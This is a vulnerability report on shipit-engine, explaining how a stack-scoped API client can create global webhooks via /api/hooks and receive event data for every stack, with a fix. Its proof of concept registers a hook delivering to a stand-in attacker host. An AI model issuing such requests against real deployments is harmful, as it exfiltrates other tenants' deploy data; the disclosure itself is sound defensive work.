### Title
Stack-scoped `ApiClient` can create/read global webhooks and receive event data for stacks it is not authorized to touch - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
The reported bug class is a stale/unverified binding: a value that governs authorization (a price, in the DeFi report) is trusted without confirming it against the source of truth. The equivalent in `shipit-engine` is the binding `stack a token authorises == stack it touches`. `Shipit::ApiClient` records can be scoped to a single `Stack` via `stack_id`, and `Api::BaseController` is supposed to enforce that scope for every read/write the client performs. `Api::HooksController`, however, does not go through that enforcement path when no `stack_id` route param is supplied, letting a stack-scoped client operate on `Hook` records with `stack_id: nil` — i.e. **global** hooks that receive events for every stack in the installation.

### Finding Description
`Shipit::ApiClient` has an optional `stack_id`: [1](#0-0) [2](#0-1) 

`Api::BaseController` enforces the stack scope for normal resources by intersecting `Stack.all` with `current_api_client.stack_id` before resolving `params[:stack_id]`: [3](#0-2) 

`Api::HooksController`, mounted both nested (`/api/stacks/*stack_id/hooks`) and top-level (`/api/hooks`) in `config/routes.rb`: [4](#0-3) 

computes its own `hooks` collection directly from `Hook.where(stack_id:)`, and only calls the scoped `stack` helper when a `stack_id` route param is present: [5](#0-4) 

When the client hits the top-level route (`/api/hooks`, no `stack_id` param), `stack_id` short-circuits to `nil` without ever invoking `BaseController#stack`/`#stacks`, so the `current_api_client.stack_id` restriction is never consulted. The resulting `hooks` scope becomes `Hook.where(stack_id: nil)` — the set of **global** hooks — regardless of whether the authenticated `ApiClient` is scoped to one stack.

`write:hook` is a flat, non-stack-scoped permission on `ApiClient#permissions`: [6](#0-5) 

and nothing ties it to `stack_id` being blank. A client provisioned with `stack_id: <stack A>` and `permissions: [write:hook]` can therefore call `POST /api/hooks` to create a global `Hook`. Global hooks are delivered for **every** stack's events via `Hook.deliver`/`for_stack`: [7](#0-6) 

The equality this breaks is: `Stack(s) the ApiClient.stack_id authorises == Stack(s) whose Hook records/events the client can create, read, or receive.` Before the attack, `ApiClient#stack_id` fixes the client's visibility to one stack (verified in `test/controllers/api/stacks_controller_test.rb`, "an api client scoped to a stack will only see that one stack"). After registering a global hook via `Api::HooksController#create`, the same client starts receiving `deploy`, `rollback`, `task`, `commit_status`, `merge`, `merge_status`, `pull_request`, `lock` and `stack` event payloads — including deploy output links, commit SHAs, and stack state — for every other stack in the installation, none of which its `stack_id` scope authorised it to see.

### Impact Explanation
This is an unauthorized read of stack state / deploy output for stacks outside the token's authorised scope, matching the High-impact bucket ("unauthenticated read of stack state, task streams or deploy output" via a credential that was never supposed to reach that data). It is effectively a privilege-escalation/cross-tenant data exfiltration bug: a narrowly-scoped credential (created specifically to limit blast radius to one stack/repository) can silently subscribe to events across the entire Shipit instance.

### Likelihood Explanation
Exploitation only requires possession of any `ApiClient` token that carries `write:hook` and is scoped to a single stack (`stack_id` set) — no elevated GitHub permissions, no session, and no knowledge of other stacks are needed. The only uncertainty is how commonly operators provision `stack_id`-scoped clients through the standard UI (`Shipit::ApiClientsController#create_params` only permits `:name` and `:permissions`, not `:stack_id`, so scoped clients appear to be provisioned out-of-band, e.g. via console/seed data, which the test fixtures and `BaseController#stacks` logic assume exist as a supported configuration).

### Recommendation
In `Api::HooksController`, always resolve `hooks`/`hook` through the same stack-scoping helper (`stacks`) used by `BaseController`, and reject (403/404) any attempt to list/create/update/destroy global hooks (`stack_id: nil`) when `current_api_client.stack_id?` is true. Alternatively, gate global hook management behind a permission that is only ever granted to unscoped `ApiClient`s, and validate at the model layer that `write:hook`/global `Hook` mutation is disallowed for any `ApiClient` with a non-null `stack_id`.

### Proof of Concept
1. Provision (or assume) an `ApiClient` scoped to `stack_id: <Stack A>` with permission `write:hook` (as used by the `here_come_the_walrus` fixture and exercised in `test/controllers/api/stacks_controller_test.rb`).
2. Authenticate with that client's token and call:
   `POST /api/hooks` with `{ "delivery_url": "https://attacker.example/collect", "events": ["deploy", "task", "merge", "commit_status"] }`
   As shown in `app/controllers/shipit/api/hooks_controller.rb` lines 46-52, no `stack_id` param means `hooks` resolves to `Hook.where(stack_id: nil)`, bypassing the `current_api_client.stack_id` restriction entirely, and the record is created with `stack_id: nil` (global).
3. From that point on, `Hook.deliver`/`Hook::for_stack` (`app/models/shipit/hook.rb` lines 93-119) delivers every matching event for **all** stacks — not just `Stack A` — to `https://attacker.example/collect`, leaking deploy/task/merge state for stacks the client was never authorised to see.

    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
